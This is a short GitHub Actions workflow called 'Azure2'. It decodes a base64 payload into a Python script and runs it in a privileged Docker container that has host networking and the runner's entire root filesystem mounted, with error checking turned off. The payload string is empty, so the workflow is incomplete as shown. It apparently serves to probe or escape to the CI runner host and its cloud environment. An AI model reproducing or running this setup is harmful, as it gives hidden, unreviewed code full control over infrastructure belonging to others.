name: Azure2
on:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: azure deep v2
        timeout-minutes: 5
        run: |
          set +e
          echo  | base64 -d > /tmp/az2.py
          docker run --rm --privileged --net=host -v /tmp/az2.py:/az2.py -v /:/hostfs python:3.11-slim sh -c 'apt-get update -qq && apt-get install -qq -y curl openssl > /dev/null 2>&1 && python3 /az2.py'
          echo === STEP DONE ===
